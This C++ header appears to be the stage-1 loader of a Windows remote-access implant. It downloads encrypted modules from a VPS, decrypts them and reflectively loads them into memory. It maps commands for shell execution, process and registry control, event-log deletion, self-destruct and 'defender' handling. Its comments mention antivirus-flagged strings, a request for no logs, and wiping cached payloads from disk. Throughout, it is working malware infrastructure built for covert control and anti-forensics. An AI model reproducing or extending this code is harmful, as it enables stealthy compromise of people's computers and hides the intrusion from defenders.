#pragma once
// ══════════════════════════════════════════════════════════════════════════
// Stage-2 module loader — the stage-1 side of the two-stage architecture.
//
// Responsibilities:
//   1. Resolve command → module name (e.g. "screenshot_start" → "screenshot")
//   2. On first use, fetch the encrypted .bin blob (from %TEMP%\pnp_cache\
//      or from the VPS), decrypt with the room-token-derived key, reflective-
//      load the PE image into memory, call Stage2Init with a real HostCtx.
//   3. Dispatch subsequent matching commands into the registered handlers.
//   4. On service shutdown: call Stage2Shutdown, unload, zero+delete cache
//      blobs from disk.
//
// Thread safety: all public functions are protected by a single mutex. The
// handler-dispatch path is inherently serialized by the WSS message-pump
// thread, so the mutex is uncontended in practice.
//
// Dependencies:
//   * aes_gcm.h, reflective_loader.h, stage2_abi.h (already in repo)
//   * The stage-1 host provides two free functions that the loader calls:
//       - stage1_ws_send(const char*)           // send JSON to viewer
//       - stage1_ws_send_bin(const uint8_t*, size_t, const char*)
//       - stage1_log(int level, const char*)
//       - stage1_get_config(const char*)
//       - stage1_get_config_int(const char*, int)
//     These are wired in main.cpp (see stage 3b).
// ══════════════════════════════════════════════════════════════════════════

#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include <unordered_map>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <memory>
#include <thread>
#include <chrono>
#include <fstream>

#include "aes_gcm.h"
#include "reflective_loader.h"
#include "stage2_abi.h"

namespace stage2 {

// ── The free functions that stage-1 must implement (see main.cpp) ────────
// They bridge Stage2HostCtx callbacks back into the live WebSocket / config.
void stage1_ws_send(const char* json);
void stage1_ws_send_bin(const uint8_t* data, size_t size, const char* type_hint);
void stage1_log(int level, const char* msg);
const char* stage1_get_config(const char* key);
int  stage1_get_config_int(const char* key, int def);
std::string stage1_room_token();
// ABI v1.1 additions — implemented in main.cpp stage2 bridge namespace.
void stage1_stop_stream();
void stage1_host_exit(int exit_code);

// ── Command → module mapping (built from STAGE2_AUDIT.md) ────────────────
// Returns the module short-name (e.g. "screenshot") or nullptr if the
// command is stage-1 native (no stage-2 module should be loaded for it).
inline const char* cmd_to_module(const std::string& cmd) {
    // Prefix map commented out until the corresponding stage-2 modules
    // are actually built. Listing a prefix here causes the main.cpp
    // lazy-load dispatcher to try to fetch that .bin from the VPS and
    // error out with "X module not available" when the module doesn't
    // exist yet. Re-enable each line as the module is implemented.
    //
    // struct Entry { const char* prefix; const char* module; };
    // static const Entry prefix_map[] = {
    //     {"screenshot_",  "screenshot"},
    //     {"audio_",       "audio"},
    //     {"stream_",      "stream"},
    //     {"record_",      "stream"},
    //     {"webrtc_",      "stream"},
    // };
    // for (auto& e : prefix_map) {
    //     size_t n = strlen(e.prefix);
    //     if (cmd.size() >= n && cmd.compare(0, n, e.prefix) == 0) return e.module;
    // }

    static const std::unordered_map<std::string, const char*> exact_map = {
        // stream.bin — NOT YET BUILT, commented out (see prefix_map note above)
        // {"request_keyframe", "stream"},

        // filemgr.bin
        {"file_delete",      "filemgr"},
        {"file_mkdir",       "filemgr"},
        {"file_rename",      "filemgr"},
        {"file_copy",        "filemgr"},
        {"file_write_text",  "filemgr"},
        {"file_write_chunk", "filemgr"},
        {"config_write",     "filemgr"},

        // procmgr.bin
        {"proc_kill",        "procmgr"},
        {"proc_launch",      "procmgr"},
        {"term_exec",        "procmgr"},
        {"svc_control",      "procmgr"},
        {"reg_set_value",    "procmgr"},
        {"reg_delete_value", "procmgr"},
        {"reg_create_key",   "procmgr"},
        {"reg_delete_key",   "procmgr"},

        // defender.bin
        {"defender_status",  "defender"},
        {"evtlog_set_config","defender"},
        {"eventlog_delete",  "defender"},
        {"host_restart",     "defender"},
        {"host_update",      "defender"},
        {"self_destruct",    "defender"},

        // sysinfo.bin — heavy read-only enumeration (AV-flag strings)
        {"drives_list",         "sysinfo"},
        {"device_list",         "sysinfo"},
        {"installed_programs",  "sysinfo"},
        {"speed_test_internet", "sysinfo"},
        {"host_relay_speed",    "sysinfo"},
        {"sys_info",            "sysinfo"},
        {"proc_list",           "sysinfo"},
        {"svc_list",            "sysinfo"},
        {"reg_list",            "sysinfo"},
        {"eventlog_list",       "sysinfo"},
    };
    auto it = exact_map.find(cmd);
    return (it == exact_map.end()) ? nullptr : it->second;
}

// ── Internal: one loaded module ─────────────────────────────────────────
struct LoadedStage2 {
    std::string                 name;                 // "screenshot"
    pe::LoadedModule    mod;
    Stage2InitFn                init_fn = nullptr;
    Stage2ShutdownFn            shutdown_fn = nullptr;
    std::string                 cache_path;           // .bin on disk (for delete on shutdown)
};

struct CommandEntry {
    Stage2CommandFn fn;
    void*           user_ctx;
};

// ── The registry (single instance per process) ──────────────────────────
class Registry {
public:
    static Registry& inst() { static Registry r; return r; }

    // Called by loaded modules (via HostCtx.register_cmd)
    void register_command(const char* name, Stage2CommandFn fn, void* ctx) {
        std::lock_guard<std::recursive_mutex> lk(mu_);
        cmds_[name] = CommandEntry{fn, ctx};
    }

    // Try to dispatch a command. Returns true if a handler was found and
    // invoked (either a stage-2 handler already registered, or one that
    // became available after an on-demand load). Returns false only if
    // the command has no stage-2 mapping at all.
    bool dispatch(const std::string& cmd, const std::string& json_args) {
        CommandEntry ent{};
        bool found = false;
        {
            std::lock_guard<std::recursive_mutex> lk(mu_);
            auto it = cmds_.find(cmd);
            if (it != cmds_.end()) { ent = it->second; found = true; }
        }
        if (found) {
            // Call OUTSIDE the lock so handlers may re-enter safely.
            ent.fn(json_args.c_str(), ent.user_ctx);
            return true;
        }

        // Not registered yet — try on-demand load.
        const char* module = cmd_to_module(cmd);
        if (!module) return false;

        // If the blob isn't cached yet, trigger a background fetch and
        // report failure for this call. The viewer should retry — by then
        // the blob will be on disk and ensure_loaded will succeed.
        // We deliberately do NOT block the WSS message-pump thread.
        if (!ensure_cached(module)) {
            kick_fetch_async(module);
            return false;
        }

        if (!ensure_loaded(module)) return false;

        // Retry after load; Stage2Init should have registered handlers.
        {
            std::lock_guard<std::recursive_mutex> lk(mu_);
            auto it = cmds_.find(cmd);
            if (it == cmds_.end()) return false;
            ent = it->second;
        }
        ent.fn(json_args.c_str(), ent.user_ctx);
        return true;
    }

    // Non-blocking single-module fetch (for on-demand dispatch path).
    void kick_fetch_async(const std::string& module_name) {
        // Coalesce: if a fetch is already in flight for this module, skip.
        {
            std::lock_guard<std::mutex> lk(pending_mu_);
            for (auto& kv : pending_fetches_) {
                if (kv.second->module == module_name) return;
            }
        }
        std::thread([this, module_name]{
            fetch_blob_sync(module_name, 20000);
        }).detach();
    }

    // Explicitly load a module by name (e.g. at startup to pre-warm).
    bool ensure_loaded(const std::string& module_name) {
        std::lock_guard<std::recursive_mutex> lk(mu_);
        if (modules_.count(module_name)) return true;
        return load_locked(module_name);
    }

    // Quick check: is the named module loaded (Stage2Init returned 0)?
    // Used by the command dispatcher to decide whether a direct dispatch
    // will succeed or whether we need to offload to a worker that waits
    // for on-demand fetch+load.
    bool is_module_loaded(const std::string& module_name) {
        std::lock_guard<std::recursive_mutex> lk(mu_);
        return modules_.count(module_name) > 0;
    }

    // Synchronously ensure a module is loaded, waiting for the blob fetch
    // if it isn't cached yet. Returns true on success, false on timeout.
    //
    // MUST NOT be called from the WSS message-pump thread: fetch_blob_sync
    // blocks waiting for a stage2_blob response whose delivery comes via
    // the WSS pump itself → deadlock. Callers must be on a worker thread.
    //
    // Used by host_update / other commands that MUST succeed on the first
    // viewer attempt even if the stage-2 module hasn't prefetched yet after
    // a fresh service start.
    bool ensure_module_ready_sync(const std::string& module_name, int timeout_ms = 15000) {
        {
            std::lock_guard<std::recursive_mutex> lk(mu_);
            if (modules_.count(module_name)) return true;
        }
        if (!ensure_cached(module_name)) {
            if (!fetch_blob_sync(module_name, timeout_ms)) return false;
        }
        return ensure_loaded(module_name);
    }

    // ── Blob fetch over WSS ──────────────────────────────────────────────
    // The host's stage-1 speaks to the VPS over its existing authenticated
    // WebSocket. `fetch_blob_sync` sends a `stage2_fetch` command and blocks
    // the CALLING thread (must NOT be the WSS message-pump thread) until
    // either the response arrives via `on_fetch_response` or the timeout.
    //
    // On success: the encrypted blob is written to %TEMP%\pnp_cache\<mod>.bin
    // so the next call to `ensure_loaded` finds and uses it.

    bool fetch_blob_sync(const std::string& module_name, int timeout_ms = 15000) {
        auto pf = std::make_shared<PendingFetch>();
        pf->module = module_name;

        std::string req_id;
        {
            char buf[48];
            uint64_t n = ++fetch_counter_;
            _snprintf_s(buf, sizeof(buf), _TRUNCATE, "s2_%llu_%lu",
                        (unsigned long long)n, (unsigned long)GetTickCount());
            req_id = buf;
        }
        {
            std::lock_guard<std::mutex> lk(pending_mu_);
            pending_fetches_[req_id] = pf;
        }

        // Send request: {"cmd":"stage2_fetch","id":"...","module":"..."}
        std::string j = "{\"cmd\":\"stage2_fetch\",\"id\":\"" + req_id +
                        "\",\"module\":\"" + module_name + "\"}";
        stage1_log(0, ("stage2: fetch_blob_sync sending " + module_name + " id=" + req_id).c_str());
        stage1_ws_send(j.c_str());

        // Wait for response.
        std::unique_lock<std::mutex> lk(pf->mu);
        bool got = pf->cv.wait_for(lk, std::chrono::milliseconds(timeout_ms),
                                   [&]{ return pf->done; });

        {
            std::lock_guard<std::mutex> g(pending_mu_);
            pending_fetches_.erase(req_id);
        }

        if (!got || !pf->ok || pf->blob.empty()) {
            stage1_log(2, ("stage2: fetch timeout/err " + module_name).c_str());
            return false;
        }

        // Write blob to cache.
        auto path = cache_path_for(module_name);
        if (path.empty()) return false;
        std::ofstream f(path, std::ios::binary | std::ios::trunc);
        if (!f) { stage1_log(3, "stage2: cache write failed"); return false; }
        f.write(reinterpret_cast<const char*>(pf->blob.data()), (std::streamsize)pf->blob.size());
        f.close();
        stage1_log(1, ("stage2: cached " + module_name + " (" +
                       std::to_string(pf->blob.size()) + " B)").c_str());
        return true;
    }

    // Called from the WSS message-pump when a response with
    // data.cmd == "stage2_blob" arrives. Wakes fetch_blob_sync().
    void on_fetch_response(const std::string& id, bool ok,
                           const std::string& /*module*/,
                           std::vector<uint8_t> blob) {
        std::shared_ptr<PendingFetch> pf;
        {
            std::lock_guard<std::mutex> lk(pending_mu_);
            auto it = pending_fetches_.find(id);
            if (it == pending_fetches_.end()) return;   // stale / unknown id
            pf = it->second;
        }
        {
            std::lock_guard<std::mutex> lk(pf->mu);
            pf->ok   = ok;
            pf->blob = std::move(blob);
            pf->done = true;
        }
        pf->cv.notify_all();
    }

    // Called from main.cpp whenever the WSS connection drops. Without this,
    // any fetch_blob_sync waiting for a response that was in flight at the
    // time of the disconnect would block for the full timeout (15s default),
    // holding up subsequent prefetches. Failing them fast lets the prefetch
    // loop move on to the next module via the new connection.
    void cancel_all_pending_fetches() {
        std::vector<std::shared_ptr<PendingFetch>> waiters;
        {
            std::lock_guard<std::mutex> lk(pending_mu_);
            for (auto& kv : pending_fetches_) waiters.push_back(kv.second);
            pending_fetches_.clear();
        }
        for (auto& pf : waiters) {
            {
                std::lock_guard<std::mutex> lk(pf->mu);
                pf->ok   = false;
                pf->blob.clear();
                pf->done = true;
            }
            pf->cv.notify_all();
        }
    }

    // Kick off a background thread that fetches every known module blob
    // (screenshot, audio, stream, filemgr, procmgr, defender). Safe to call
    // repeatedly — concurrent calls share the same thread once it finishes.
    // Returns true if all three primary modules are already loaded (their
    // command handlers registered in cmds_).  Used by prefetch retry logic
    // and by monitoring code to know whether a retry is worth trying.
    bool all_primary_modules_loaded() {
        std::lock_guard<std::recursive_mutex> lk(mu_);
        return modules_.count("filemgr") > 0
            && modules_.count("procmgr") > 0
            && modules_.count("defender") > 0;
    }

    // Disabled per user request ("никаких логов"). Was writing prefetch
    // progress to C:\Windows\Temp\pnp_prefetch.log for the race-condition
    // debug in v1.0.189-v1.0.192. With v1.0.192's prefetch fix in place,
    // on-disk logging is no longer needed.
    static void prefetch_diag(const std::string& /*line*/) {
        // no-op
    }

    void prefetch_all_async() {
        if (prefetch_running_.exchange(true)) {
            prefetch_diag("prefetch_all_async: SKIP, already running");
            stage1_log(2, "stage2: prefetch already running, skipping");
            return;
        }
        prefetch_diag("prefetch_all_async: START");
        stage1_log(1, "stage2: prefetch_all_async starting");
        std::thread([this]{
            // RAII guard: even if an exception escapes the loop, flip the
            // running-flag back off so the 60 s retry loop in main.cpp can
            // kick again. Previously a throw inside fetch_blob_sync left
            // prefetch_running_ stuck at true forever — every retry saw
            // "already running, skipping" and the host never recovered
            // from a single early failure.
            struct RunGuard {
                std::atomic<bool>& flag;
                ~RunGuard() { flag.store(false); }
            } _guard{ prefetch_running_ };

            try {
                // Do NOT wipe the cache every time: previous runs may have
                // successfully cached 3 of 4 modules and we should NOT
                // throw those away just because one failed. Cache is already
                // keyed by module name so stale/old blobs won't be silently
                // mixed with new ones (aes-gcm decrypt fails on stale keys,
                // then the file is re-fetched).
                //
                // wipe_cache_dir() is still called at service startup via
                // shutdown_all() and at install/uninstall time by the .bat
                // scripts, which is the correct moment to clear stale data.

                // Order: sysinfo + defender first (touched most frequently by
                // the viewer for status display), then procmgr, then filemgr.
                // Previously filemgr was first and consistently lost the race
                // to the initial auth-settle window, so it never prefetched.
                static const char* kModules[] = { "sysinfo", "defender", "procmgr", "filemgr" };
                for (auto m : kModules) {
                    std::string name = m;
                    {
                        std::lock_guard<std::recursive_mutex> lk(mu_);
                        if (modules_.count(name)) {
                            prefetch_diag("  " + name + ": skip (already loaded)");
                            continue;
                        }
                    }

                    bool fetched = false;
                    for (int attempt = 0; attempt < 2 && !fetched; ++attempt) {
                        if (attempt > 0) std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        prefetch_diag("  " + name + ": fetch attempt " +
                                      std::to_string(attempt + 1));
                        fetched = fetch_blob_sync(m, 8000);
                        prefetch_diag("  " + name + ": fetch_blob_sync -> " +
                                      (fetched ? "OK" : "FAIL"));
                    }
                    if (!fetched) {
                        prefetch_diag("  " + name + ": both attempts FAILED, skipping");
                        continue;
                    }
                    bool loaded = ensure_loaded(m);
                    prefetch_diag("  " + name + ": ensure_loaded -> " +
                                  (loaded ? "OK" : "FAIL"));
                }
                prefetch_diag("prefetch_all_async: DONE");
            } catch (const std::exception& e) {
                std::string m = "stage2: prefetch threw: "; m += e.what();
                stage1_log(3, m.c_str());
            } catch (...) {
                stage1_log(3, "stage2: prefetch threw unknown");
            }
            // RunGuard flips prefetch_running_ back to false on return/throw.
        }).detach();
    }

    // Called on service shutdown.
    void shutdown_all() {
        std::lock_guard<std::recursive_mutex> lk(mu_);
        for (auto& kv : modules_) {
            if (kv.second->shutdown_fn) kv.second->shutdown_fn();
            pe::unload(kv.second->mod);
            if (!kv.second->cache_path.empty()) {
                overwrite_and_delete(kv.second->cache_path);
            }
        }
        modules_.clear();
        cmds_.clear();
        // Belt-and-braces: wipe ANY leftover .bin in the cache dir. Catches
        // orphans from prior runs where a blob was fetched but the module
        // never loaded (e.g. decrypt failure after key rotation, crash
        // between fetch and load, etc.). Without this, the next startup's
        // `ensure_cached` would think the blob is good and skip fetching —
        // but since it was encrypted with a stale key it won't decrypt.
        wipe_cache_dir();
    }

    // Helper: returns true if %TEMP%\pnp_cache\<mod>.bin already exists.
    static bool ensure_cached(const std::string& module_name) {
        auto p = cache_path_for(module_name);
        if (p.empty()) return false;
        DWORD a = GetFileAttributesA(p.c_str());
        return (a != INVALID_FILE_ATTRIBUTES) && !(a & FILE_ATTRIBUTE_DIRECTORY);
    }

    // Delete every .bin in %TEMP%\pnp_cache\ without touching anything else.
    // Safe to call repeatedly; tolerates a missing directory.
    static void wipe_cache_dir() {
        char tmp[MAX_PATH];
        DWORD n = GetTempPathA(MAX_PATH, tmp);
        if (n == 0 || n > MAX_PATH) return;
        std::string dir = std::string(tmp, n) + "pnp_cache\\";
        std::string pat = dir + "*.bin";
        WIN32_FIND_DATAA fd{};
        HANDLE h = FindFirstFileA(pat.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            std::string full = dir + fd.cFileName;
            SetFileAttributesA(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileA(full.c_str());
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }

private:
    struct PendingFetch {
        std::mutex              mu;
        std::condition_variable cv;
        bool                    done = false;
        bool                    ok   = false;
        std::string             module;
        std::vector<uint8_t>    blob;
    };

    std::recursive_mutex mu_;
    std::map<std::string, std::unique_ptr<LoadedStage2>> modules_;
    std::unordered_map<std::string, CommandEntry>        cmds_;

    std::mutex                                           pending_mu_;
    std::unordered_map<std::string, std::shared_ptr<PendingFetch>> pending_fetches_;
    std::atomic<uint64_t>                                fetch_counter_{0};
    std::atomic<bool>                                    prefetch_running_{false};

    // Build (once) the HostCtx bound to stage-1 callbacks, and return a
    // pointer that stays valid for the process lifetime.
    // IMPORTANT: stage-2 modules typically cache this pointer in a global
    // (see stage2_sample.cpp `g_host`). Passing a stack-local would leave
    // them with a dangling pointer the moment Stage2Init returns.
    static Stage2HostCtx* host_ptr() {
        static std::string token = stage1_room_token();
        static Stage2HostCtx h = []{
            Stage2HostCtx x = {};
            x.abi_version    = STAGE2_ABI_VERSION;
            x.log            = [](int lvl, const char* m){ stage1_log(lvl, m); };
            x.send           = [](const char* j){ stage1_ws_send(j); };
            x.send_bin       = [](const uint8_t* d, size_t n, const char* t){ stage1_ws_send_bin(d, n, t); };
            x.register_cmd   = [](const char* nm, Stage2CommandFn fn, void* ctx){
                Registry::inst().register_command(nm, fn, ctx);
            };
            x.get_config     = [](const char* k){ return stage1_get_config(k); };
            x.get_config_int = [](const char* k, int d){ return stage1_get_config_int(k, d); };
            // ABI v1.1:
            x.stop_stream    = []{ stage1_stop_stream(); };
            x.host_exit      = [](int code){ stage1_host_exit(code); };
            return x;
        }();
        // `token` must outlive any use of host.room_token — both are statics, ✓
        h.room_token = token.c_str();
        return &h;
    }

    // Resolve cache path: %TEMP%\pnp_cache\<module>.bin
    static std::string cache_path_for(const std::string& module_name) {
        char tmp[MAX_PATH];
        DWORD n = GetTempPathA(MAX_PATH, tmp);
        if (n == 0 || n > MAX_PATH) return {};
        std::string p(tmp, n);
        p += "pnp_cache\\";
        CreateDirectoryA(p.c_str(), nullptr);
        p += module_name;
        p += ".bin";
        return p;
    }

    static std::vector<uint8_t> read_file_bytes(const std::string& path) {
        std::vector<uint8_t> out;
        std::ifstream f(path, std::ios::binary);
        if (!f) return out;
        f.seekg(0, std::ios::end);
        auto sz = (size_t)f.tellg();
        f.seekg(0, std::ios::beg);
        if (sz > 0) { out.resize(sz); f.read(reinterpret_cast<char*>(out.data()), sz); }
        return out;
    }

    static void overwrite_and_delete(const std::string& path) {
        // Best-effort wipe: write 4 KB of zeros then delete. The blob is
        // already encrypted so no plaintext leak risk — wipe is defensive
        // only, against e.g. file-system content-length metadata.
        {
            std::ofstream f(path, std::ios::binary | std::ios::trunc);
            if (f) {
                static const uint8_t zero[4096] = {0};
                f.write(reinterpret_cast<const char*>(zero), sizeof(zero));
                f.flush();
            }
        }
        if (!DeleteFileA(path.c_str())) {
            // Possibly read-only or AV hold — retry after clearing attributes.
            SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileA(path.c_str());
        }
    }

    bool load_locked(const std::string& module_name) {
        auto path = cache_path_for(module_name);
        if (path.empty()) { stage1_log(3, "stage2: GetTempPath failed"); return false; }

        auto blob = read_file_bytes(path);
        if (blob.empty()) {
            stage1_log(2, ("stage2: blob missing, need VPS fetch: " + path).c_str());
            // TODO (stage 3d): fetch from VPS if missing, then re-read.
            return false;
        }

        auto key = aesgcm::derive_key(stage1_room_token());
        std::vector<uint8_t> pt;
        if (!aesgcm::decrypt(key.data(), key.size(), blob.data(), blob.size(), pt)) {
            stage1_log(3, ("stage2: decrypt failed for " + module_name).c_str());
            return false;
        }

        std::string err;
        auto mod = pe::load(pt.data(), pt.size(), &err);
        // Wipe plaintext from memory immediately — the module is now resident.
        if (!pt.empty()) SecureZeroMemory(pt.data(), pt.size());
        if (!mod.valid()) {
            stage1_log(3, ("module load failed: " + err).c_str());
            return false;
        }

        auto init_fn = (Stage2InitFn)pe::get_proc(mod, STAGE2_INIT_EXPORT);
        if (!init_fn) {
            stage1_log(3, ("stage2: " + module_name + " missing Stage2Init").c_str());
            pe::unload(mod);
            return false;
        }

        // Use the process-wide HostCtx (lives in static storage, so stage-2
        // modules can cache the pointer without dangling-pointer risk).
        Stage2HostCtx* host = host_ptr();
        int rc = init_fn(host);
        if (rc != 0) {
            stage1_log(3, ("stage2: Stage2Init returned " + std::to_string(rc)).c_str());
            pe::unload(mod);
            return false;
        }

        auto entry = std::make_unique<LoadedStage2>();
        entry->name        = module_name;
        entry->mod         = mod;
        entry->init_fn     = init_fn;
        entry->shutdown_fn = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
        entry->cache_path  = path;
        modules_[module_name] = std::move(entry);

        stage1_log(1, ("stage2: loaded " + module_name).c_str());
        return true;
    }
};

} // namespace stage2
